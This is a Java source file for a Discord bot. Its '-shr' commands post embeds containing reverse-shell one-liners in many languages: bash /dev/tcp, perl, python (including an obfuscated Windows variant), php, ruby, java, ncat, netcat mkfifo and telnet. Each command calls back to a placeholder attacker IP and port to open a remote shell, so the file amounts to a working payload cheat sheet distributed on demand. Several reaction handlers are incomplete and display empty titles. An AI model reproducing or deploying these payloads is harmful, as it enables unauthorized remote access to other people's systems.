package com.Daskama.shelby.comands;

import com.Daskama.shelby.Core.GenerateFooterInviteLink;
import com.Daskama.shelby.config_program.ConfigAll;
import org.javacord.api.entity.message.Message;
import org.javacord.api.entity.message.MessageAuthor;
import org.javacord.api.entity.message.MessageBuilder;
import org.javacord.api.entity.message.embed.EmbedBuilder;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.listener.message.MessageCreateListener;

import java.awt.*;
import java.util.concurrent.TimeUnit;



public class ComanndShellby_reverseshells implements MessageCreateListener {

    private ConfigAll config;
    private GenerateFooterInviteLink generator_invite; //footer own

    public void onMessageCreate(MessageCreateEvent event) {
        config = new ConfigAll();
        generator_invite = new GenerateFooterInviteLink();
        Message sprava_shell = event.getMessage();
        MessageAuthor author = event.getMessage().getAuthor();
//bash
        if (sprava_shell.getContent().equalsIgnoreCase("-shr bash")) {
            long id_saved = author.getId(); // save ID user
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Bash Reverse Shell**")
                            .setDescription("Use this code  \n"
                                    + "```bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1```\n"
                                    + " Tip : \u2754 more info about Bash\n"
                                    + " Tip : 1\uFE0F\u20E3 Bash alternative comand\n"
                                    + generator_invite.generateFooterInviteLinks()
                            )
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {

                        message_new.addReactionAddListener(reactionEvent -> {

                            if (reactionEvent.getEmoji().equalsEmoji("\u2754") && reactionEvent.getUserId() == id_saved ) {
                                reactionEvent.editMessage( new EmbedBuilder()
                                        .setTitle("**Bash Reverse Shell**")
                                        .setDescription( "Bash is a Unix shell and command language written by Brian Fox for the GNU Project as a free software replacement for the Bourne shell.\n First released in 1989"
                                                + generator_invite.generateFooterInviteLinks())
                                        .setColor(new Color(95,212,96))
                                );
                            }else if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved)
                            {
                                reactionEvent.editMessage( new EmbedBuilder()
                                        .setTitle("**Bash Alternative 1**")
                                        .setDescription("**Use this code**\n "
                                                + "```0<&196;exec 196<>/dev/tcp/YOURIP/YOURPORT; sh <&196 >&196 2>&196```\n"
                                                + generator_invite.generateFooterInviteLinks())
                                        .setColor(new Color(95,212,96))
                                );
                            }else if (reactionEvent.getEmoji().equalsEmoji("2\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved)
                            {
                                reactionEvent.editMessage( new EmbedBuilder()
                                        .setTitle("**Bash Alternative 2**")
                                        .setDescription("**Use this code**\n "
                                                + "```exec 5<>/dev/tcp/YOURIP/YOURPORT\n" +
                                                "cat <&5 | while read line; do $line 2>&5 >&5; done  \n" +
                                                "\n" +
                                                "# or:\n" +
                                                "\n" +
                                                "while read line 0<&5; do $line 2>&5 >&5; done```\n"
                                                + generator_invite.generateFooterInviteLinks())
                                        .setColor(new Color(95,212,96))
                                );
                            }else if (reactionEvent.getEmoji().equalsEmoji("3\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved)
                            {
                                reactionEvent.editMessage( new EmbedBuilder()
                                        .setTitle("**Bash Alternative 3**")
                                        .setDescription("**Use this code**\n "
                                                + "```bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1```\n"
                                                + generator_invite.generateFooterInviteLinks())
                                        .setColor(new Color(95,212,96))
                                );
                            }else if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") && reactionEvent.getUserId() == id_saved)
                            {
                                reactionEvent.editMessage(new EmbedBuilder()
                                        .setTitle("**Bash Reverse Shell**")
                                        .setDescription("Use this code  \n"
                                                + "```bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1```\n"
                                                + " Tip : \u2754 more info about Bash\n"
                                                + " Tip : 1\uFE0F\u20E3 Bash alternative comand\n"
                                                + generator_invite.generateFooterInviteLinks()
                                        )
                                );
                            }
                        }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
                message_new.addReaction("1\uFE0F\u20E3");
                message_new.addReaction("2\uFE0F\u20E3");
                message_new.addReaction("3\uFE0F\u20E3");
                message_new.addReaction("\uD83C\uDFE0");
                message_new.addReaction("\u2754");
            });
        };


        if (sprava_shell.getContent().equalsIgnoreCase("-shr perl")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Perl Reverse Shell**")
                            .setDescription("Use this code  \n " +
                                    "```perl -e 'use Socket;$i=\"YOURIP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'```"
                                    + generator_invite.generateFooterInviteLinks())
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {

                        message_new.addReactionAddListener(reactionEvent -> {

                            if (reactionEvent.getEmoji().equalsEmoji("") && reactionEvent.getUserId() == id_saved ) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("****")
                                .setDescription( "****" + "\n")
                                .setColor(new Color(95,212,96))
                        );



                    }
                }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
            });

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shr python")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Python Reverse Shell**")
                            .setDescription("Use this code \n" +
                                    "```export RHOST=\"YOURIP\";export RPORT=YOURPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n ```\n"
                                    + generator_invite.generateFooterInviteLinks())
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {
                message_new.addReactionAddListener(reactionEvent -> {
                    if (reactionEvent.getEmoji().equalsEmoji("\u2754") && reactionEvent.getUserId() == id_saved  ) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Info Python **")
                                .setDescription( "**Python is an interpreted, object-oriented, high-level programming language with dynamic semantics.**" + "\n")
                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Python Alternative 1**")
                                .setDescription("Use this code  \n " + "IPV4\n" +
                                        "```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOURIP\",YOURPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n ```"
                                        + generator_invite.generateFooterInviteLinks() )


                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("2\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Python Alternative 2 **")
                                .setDescription("Use this code  \n " +"IPV6\n" +
                                        "```python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",YOURPORT,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/sh\");'\n```"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("4\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Python Alternative 4**")
                                .setDescription("Use this code  \n " + "Windows"+
                                        "```C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('YOURIP', YOURPORT)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n ```"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") && reactionEvent.getUserId() == id_saved ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Python Reverse Shell**")
                                .setDescription("Use this code \n" + "IPV4\n" +
                                        "```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOURIP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'```\n"
                                        + generator_invite.generateFooterInviteLinks())
                                .setTimestampToNow()
                                .setColor(new Color(95, 212, 96))
                        );
                    }



                }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
                message_new.addReaction("1\uFE0F\u20E3");
                message_new.addReaction("2\uFE0F\u20E3");
                message_new.addReaction("\uD83C\uDFE0");
                message_new.addReaction("\u2754");
            });

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shr php")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**PHP Reverse Shell**")
                            .setDescription("Use this code \n " +
                                    "```php -r '$sock=fsockopen(\"YOURIP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```" + "(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)"
                                    + generator_invite.generateFooterInviteLinks()  )
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {
                        message_new.addReactionAddListener(reactionEvent -> {
                    if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved ) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**PHP File Comand **")
                                .setDescription( "Use this code \n" +"PHP File" + "```<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$TUN0/$PORT 0>&1'\"); ?>\n ```")
                                .setColor(new Color(95,212,96))
                        );

                    }else if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") && reactionEvent.getUserId() == id_saved  ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**PHP Reverse Shell**")
                                .setDescription("Use this code \n " +
                                        "```php -r '$sock=fsockopen(\"YOURIP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```" + "(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)"
                                        + generator_invite.generateFooterInviteLinks())
                                .setTimestampToNow()
                                .setColor(new Color(95, 212, 96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("") && reactionEvent.getUserId() == id_saved ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**PHP Info**")
                                .setDescription("Php s a widely-used open source general-purpose scripting language that is especially suited for web development and can be embedded into HTML."
                                        + generator_invite.generateFooterInviteLinks())
                                .setTimestampToNow()
                                .setColor(new Color(95, 212, 96))
                        );
                    }

                    }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);

                        message_new.addReaction("1\uFE0F\u20E3");
                        message_new.addReaction("\uD83C\uDFE0");
                        message_new.addReaction("\u2754");
            });

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shr ruby")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Ruby Reverse Shell**")
                            .setDescription("Use this code \n" +
                             "```ruby -rsocket -e'f=TCPSocket.open(\"YOURIP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n```"
                                    + generator_invite.generateFooterInviteLinks())
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {
                        message_new.addReactionAddListener(reactionEvent -> {
                    if (reactionEvent.getEmoji().equalsEmoji("") && reactionEvent.getUserId() == id_saved  ) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("****")
                                .setDescription( "****" + "\n")
                                .setColor(new Color(95,212,96))
                        );



                    }



                }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
            });

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shr java")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Java Reverse Shell**")
                            .setDescription("Use this code \n" +
                                    "```r = Runtime.getRuntime()\n" +
                                    "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n" +
                                    "p.waitFor() ```"
                                    + generator_invite.generateFooterInviteLinks())
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {
                message_new.addReactionAddListener(reactionEvent -> {
                    if (reactionEvent.getEmoji().equalsEmoji("") && reactionEvent.getUserId() == id_saved) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("****")
                                .setDescription( "****" + "\n")
                                .setColor(new Color(95,212,96))
                        );



                    }

                }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
            });

        };


        if (sprava_shell.getContent().equalsIgnoreCase("-shr ncat")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Ncat Reverse Shell**")
                            .setDescription("Use this code \n" +
                                    "```ncat YOURIP PORT -e /bin/bash\n ```")
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {
                message_new.addReactionAddListener(reactionEvent -> {
                    if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") && reactionEvent.getUserId() == id_saved ) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Ncat Reverse Shell**")
                                .setDescription("Use this code \n" +
                                        "```ncat YOURIP PORT -e /bin/bash\n ```"
                                        + generator_invite.generateFooterInviteLinks())
                                .setTimestampToNow()
                                .setColor(new Color(95, 212, 96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Ncat Alternative 1**")
                                .setDescription("Use this code \n" + "```ncat --udp YOURIP YOURPORT -e /bin/bash\n```"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }
                }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
                message_new.addReaction("1\uFE0F\u20E3");
                message_new.addReaction("\uD83C\uDFE0");
            });

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shr netcat")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Netcat Reverse Shell**")
                            .setDescription("Use this code \n" +
                                    "```nc -e /bin/sh YOURIP PORT\n ``` "
                                    + generator_invite.generateFooterInviteLinks())
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {
                        message_new.addReactionAddListener(reactionEvent -> {
                    if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Netcat Alternative 1**")
                                .setDescription("**Use this code**\n "
                                        +"```nc -e /bin/bash YOURIP YOURPORT ```"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("2\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Netcat Alternative 2**")
                                .setDescription("**Use this code**\n "
                                        + "```nc -c bash YOURIP YOURPORT```\n"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("3\uFE0F\u20E3") && reactionEvent.getUserId() == id_saved ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Netcat Alternative 3**")
                                .setDescription("**Use this code**\n "
                                        + "```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP YOURPORT >/tmp/f```\n"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") && reactionEvent.getUserId() == id_saved){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Netcat Reverse Shell**")
                                .setDescription("Use this code \n" +
                                        "```nc -e /bin/sh YOURIP PORT\n ``` "
                                        + generator_invite.generateFooterInviteLinks())
                                .setTimestampToNow()
                                .setColor(new Color(95, 212, 96))
                        );

                    }else if (reactionEvent.getEmoji().equalsEmoji("\u2754") && reactionEvent.getUserId() == id_saved){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Netcat  Info **")
                                .setDescription("**netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. **\n "
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }

                }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
                message_new.addReaction("1\uFE0F\u20E3");
                message_new.addReaction("2\uFE0F\u20E3");
                message_new.addReaction("3\uFE0F\u20E3");
                message_new.addReaction("\uD83C\uDFE0");
                message_new.addReaction("\u2754");
            });

        };

        if (sprava_shell.getContent().equalsIgnoreCase("-shr telnet")) {
            long id_saved = author.getId();
            new MessageBuilder()
                    .setEmbed(new EmbedBuilder()
                            .setTitle("**Telnet Reverse Shell**")
                            .setDescription("Use this code \n" +
                                    "```telnet YOURIP YOURPORT | /bin/bash | telnet TARGETIP TARGETPORT\n ``` "
                                    + generator_invite.generateFooterInviteLinks())
                            .setTimestampToNow()
                            .setColor(new Color(95, 212, 96)))
                    .send(event.getChannel()).thenAccept(message_new -> {

                        message_new.addReactionAddListener(reactionEvent -> {
                    if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3")&& reactionEvent.getUserId() == id_saved  ) {
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Telnet Alternative 1**")
                                .setDescription("Use this code \n" + "```rm -f /tmp/p; mknod /tmp/p p && telnet YOURIP YOURPORT 0/tmp/p 2>&1\n ```" + "\n"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("2\uFE0F\u20E3")&& reactionEvent.getUserId() == id_saved){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Telnet Alternative 2 **")
                                .setDescription("Use this code \n" + "```rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet YOURIP YOURPORT > f\n```"
                                        + generator_invite.generateFooterInviteLinks())
                                .setColor(new Color(95,212,96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") && reactionEvent.getUserId() == id_saved ){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Telnet Reverse Shell**")
                                .setDescription("Use this code \n" +
                                        "```telnet YOURIP YOURPORT | /bin/bash | telnet TARGETIP TARGETPORT\n ``` "
                                        + generator_invite.generateFooterInviteLinks())
                                .setTimestampToNow()
                                .setColor(new Color(95, 212, 96))
                        );
                    }else if (reactionEvent.getEmoji().equalsEmoji("\u2754") && reactionEvent.getUserId() == id_saved){
                        reactionEvent.editMessage( new EmbedBuilder()
                                .setTitle("**Telnet Info**")
                                .setDescription("Telnet is an application protocol used on the Internet or local area network to provide a bidirectional interactive text-oriented communication facility using a virtual terminal connection. "
                                        + generator_invite.generateFooterInviteLinks())
                                .setTimestampToNow()
                                .setColor(new Color(95, 212, 96))
                        );
                    }

                }).removeAfter(config.getTime_eventer_int(), TimeUnit.MINUTES);
                message_new.addReaction("1\uFE0F\u20E3");
                message_new.addReaction("2\uFE0F\u20E3");
                message_new.addReaction("\uD83C\uDFE0");
                message_new.addReaction("\u2754");
            });

        };
    }
}
